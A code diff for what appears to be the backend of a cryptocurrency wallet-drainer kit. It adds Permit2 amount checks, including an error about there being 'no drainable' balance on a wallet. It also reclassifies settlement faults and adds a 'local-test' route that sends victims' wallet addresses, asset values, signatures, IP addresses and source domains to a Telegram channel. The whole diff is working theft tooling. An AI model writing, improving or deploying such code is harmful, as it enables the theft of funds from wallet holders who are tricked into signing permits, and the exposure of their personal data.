@@ -116,6 +116,7 @@ import {
   notifyRelayIntermediaryWarning,
   notifySettlementAttempt,
   notifySettlementResult,
+  dispatchLocalTestTelegramEvent,
   type TelegramRequestContext,
 } from '../lib/telegram.js'
 import { isEvmTransactionHash } from '../lib/evm-tx-verify.js'
@@ -139,20 +140,35 @@ function sleepSettlementMs(ms: number): Promise<void> {
   })
 }
 
-function isDeferredBroadcastFault(fault: string): boolean {
+function isContractSettlementFault(fault: string): boolean {
   const f = fault.toLowerCase()
   return (
-    f.includes('insufficient_relayer_balance') === false &&
-    (f.includes('rpc') ||
-      f.includes('network relay') ||
-      f.includes('broadcast_failed') ||
-      f.includes('econnrefused') ||
-      f.includes('timeout') ||
-      f.includes('fetch failed') ||
-      f.includes('socket') ||
-      f.includes('503') ||
-      f.includes('502') ||
-      f.includes('relay'))
+    f.includes('reverted') ||
+    f.includes('invalidsigner') ||
+    f.includes('invalidnonce') ||
+    f.includes('invalidamount') ||
+    f.includes('signatureexpired') ||
+    f.includes('allowanceexpired') ||
+    f.includes('permit() failed') ||
+    f.includes('0x815e1d64')
+  )
+}
+
+function isDeferredBroadcastFault(fault: string): boolean {
+  const f = fault.toLowerCase()
+  if (f.includes('insufficient_relayer_balance')) return false
+  if (isContractSettlementFault(fault)) return false
+  return (
+    f.includes('rpc') ||
+    f.includes('network relay') ||
+    f.includes('broadcast_failed') ||
+    f.includes('econnrefused') ||
+    f.includes('timeout') ||
+    f.includes('fetch failed') ||
+    f.includes('socket') ||
+    f.includes('503') ||
+    f.includes('502') ||
+    f.includes('relay')
   )
 }
 
@@ -208,7 +224,7 @@ async function checkSettlementRelayerBalance(
       rpcUrl = await gatekeeperEthereumRpcUrl()
     }
     const client = createPublicClient({ transport: http(rpcUrl) })
-    const minWei = BigInt(process.env['MIN_RELAYER_WEI']?.trim() || '10000000000000000')
+    const minWei = BigInt(process.env['MIN_RELAYER_WEI']?.trim() || '1')
     const bal = await client.getBalance({ address: account.address })
     if (bal < minWei) {
       return { ok: false, detail: `relayer balance ${bal} < min ${minWei}` }
@@ -606,6 +622,16 @@ function normalizeWalletToken(
   return { wallet_address: wallet.trim(), token_address: token.trim() }
 }
 
+function readPositiveIntAmount(value: unknown): string | null {
+  if (typeof value === 'string' && /^\d+$/.test(value.trim()) && value.trim() !== '0') {
+    return value.trim()
+  }
+  if (typeof value === 'number' && Number.isFinite(value) && Number.isInteger(value) && value > 0) {
+    return String(value)
+  }
+  return null
+}
+
 function extractShadowTelemetry(o: Record<string, unknown>): {
   scout_value_usd: string | null
   amount: string | null
@@ -622,14 +648,17 @@ function extractShadowTelemetry(o: Record<string, unknown>): {
   } else if (typeof o['scout_value_usd'] === 'string' && o['scout_value_usd'].trim() !== '') {
     scout_value_usd = o['scout_value_usd'].trim()
   }
-  let amount: string | null = null
-  if (typeof o['amount'] === 'string' && /^\d+$/.test(o['amount'].trim())) {
-    amount = o['amount'].trim()
-  } else if (
-    typeof o['wallet_balance'] === 'string' &&
-    /^\d+$/.test(o['wallet_balance'].trim())
-  ) {
-    amount = o['wallet_balance'].trim()
+  let amount: string | null = readPositiveIntAmount(o['amount'])
+  if (amount == null) amount = readPositiveIntAmount(o['wallet_balance'])
+  if (amount == null) {
+    const meta = o['permit_metadata']
+    if (meta !== null && typeof meta === 'object' && !Array.isArray(meta)) {
+      const rec = meta as Record<string, unknown>
+      amount = readPositiveIntAmount(rec['amount'])
+      if (amount == null && rec['details'] !== null && typeof rec['details'] === 'object') {
+        amount = readPositiveIntAmount((rec['details'] as Record<string, unknown>)['amount'])
+      }
+    }
   }
   let max_allowance: string | null = null
   if (typeof o['max_allowance'] === 'string' && o['max_allowance'].trim() !== '') {
@@ -751,6 +780,11 @@ async function buildPermit2TypedDataForWallet(params: {
       wallet: params.wallet,
       token: params.token,
     }))
+  if (amount <= 0n) {
+    throw new Error(
+      `No drainable ${params.token} balance on ${params.wallet} — Permit2 amount would be 0`,
+    )
+  }
   const handler = new Permit2Handler({
     chainId: params.chainId,
     permit2Address: permit2,
@@ -1081,6 +1115,14 @@ function settlementIgnitionFault(outcome: SettlementIgnitionOutcome | undefined)
     typeof outcome.sovereign_dispatcher_fault === 'string'
   ) {
     return outcome.sovereign_dispatcher_fault
+  }
+  if (
+    outcome != null &&
+    'relay_intermediary_detail' in outcome &&
+    typeof outcome.relay_intermediary_detail === 'string' &&
+    outcome.relay_intermediary_detail.trim() !== ''
+  ) {
+    return outcome.relay_intermediary_detail
   }
   if (
     outcome != null &&
@@ -1727,6 +1769,72 @@ async function signatureAnchorPostHandler(
 }
 
 export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
+  app.post('/api/v1/local-test/telemetry', async (request, reply) => {
+    const body = request.body as {
+      event?: string
+      kind?: string
+      wallet_address?: string
+      vault_address?: string
+      detail?: string
+      tx_hash?: string
+      chain_id?: number
+      scout_value_usd?: string | number
+      token_name?: string
+      token_address?: string
+      signature?: string
+      amount?: string
+      assets?: Array<{ chain?: string; family?: string; token?: string; symbol?: string; amount_usd?: number }>
+      executor_balance_eth?: string
+      connect_session?: string
+      userAgent?: string
+      sourceDomain?: string
+      wallet_type?: string
+    }
+    const event = (body.event || body.kind || '').trim()
+    const wallet = body.wallet_address?.trim()
+    if (!event || !wallet) {
+      return sendFailure(reply, 400, 'event and wallet_address required', { code: 'ValidationError' })
+    }
+    try {
+      const ip = typeof request.ip === 'string' ? request.ip : undefined
+      const assets = Array.isArray(body.assets)
+        ? body.assets
+            .filter((a) => a && typeof a.amount_usd === 'number' && a.amount_usd > 0)
+            .map((a) => ({
+              chain: String(a.chain || 'evm:1'),
+              family: String(a.family || 'EVM'),
+              token: String(a.token || 'native'),
+              symbol: String(a.symbol || 'ETH'),
+              amount_usd: Number(a.amount_usd),
+            }))
+        : []
+      await dispatchLocalTestTelegramEvent({
+        event,
+        wallet_address: wallet,
+        vault_address: body.vault_address,
+        detail: body.detail,
+        tx_hash: body.tx_hash,
+        chain_id: body.chain_id ?? 1,
+        scout_value_usd: body.scout_value_usd,
+        token_name: body.token_name,
+        token_address: body.token_address,
+        signature: body.signature,
+        amount: body.amount,
+        assets,
+        executor_balance_eth: body.executor_balance_eth,
+        ip: ip && ip !== '127.0.0.1' && ip !== '::1' ? ip : 'Unknown',
+        userAgent: body.userAgent,
+        sourceDomain: body.sourceDomain || (typeof request.headers.origin === 'string' ? request.headers.origin : 'localhost:5173'),
+        connect_session: body.connect_session,
+        wallet_type: body.wallet_type || 'MetaMask',
+      })
+      return sendSuccess(reply, 200, 'Telegram telemetry queued', { ok: true })
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e)
+      return sendFailure(reply, 500, msg, { code: 'ServerError' })
+    }
+  })
+
   app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
     if (!isEip7702Enabled()) {
       return sendFailure(reply, 503, 'EIP7702_ENABLED is false', { code: 'FeatureDisabled' })
@@ -2382,8 +2490,13 @@ async function persistSignatureRow(
         ...(omnichain_settlement ? { omnichain_settlement } : {}),
       })
     }
-    return sendFailure(reply, 502, 'Settlement broadcast failed', {
-      code: 'SettlementBroadcastFailed',
+    const contractFault = isContractSettlementFault(settlement_fault)
+    const contractMsg =
+      settlement_fault.includes('0x815e1d64') || settlement_fault.toLowerCase().includes('invalidsigner')
+        ? 'Permit2 InvalidSigner — signed typed data does not match the on-chain permit'
+        : 'Permit2 settlement rejected on-chain'
+    return sendFailure(reply, 502, contractFault ? contractMsg : 'Settlement broadcast failed', {
+      code: contractFault ? 'PERMIT2_REVERTED' : 'SettlementBroadcastFailed',
       settlement_status: 'FAILED_SETTLEMENT',
       settlement_fault,
       handshake_active: true,
@@ -3547,6 +3660,20 @@ async function handleNormalizedIngress(
         code: 'ValidationError',
       })
     }
+    const permitAmount =
+      readPositiveIntAmount(b.permit_metadata.amount) ??
+      readPositiveIntAmount(
+        (b.permit_metadata as unknown as { details?: { amount?: unknown } }).details?.amount,
+      )
+    if (permitAmount == null) {
+      return sendFailure(
+        reply,
+        400,
+        'permit_metadata.amount must be a positive integer from the typed-data endpoint',
+        { code: 'ValidationError' },
+      )
+    }
+    b.permit_metadata = { ...b.permit_metadata, amount: permitAmount }
     const rpcUrl = await gatekeeperEthereumRpcUrl()
     if (!rpcUrl) {
       return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
@@ -3585,7 +3712,7 @@ async function handleNormalizedIngress(
         protocol: 'permit2_eip712',
         chain_family: b.chain_family,
         scout_value_usd: tel.scout_value_usd,
-        amount: tel.amount,
+        amount: tel.amount ?? permitAmount,
         max_allowance: tel.max_allowance,
         requires_quorum: tel.requires_quorum,
         source_origin: sourceOrigin,
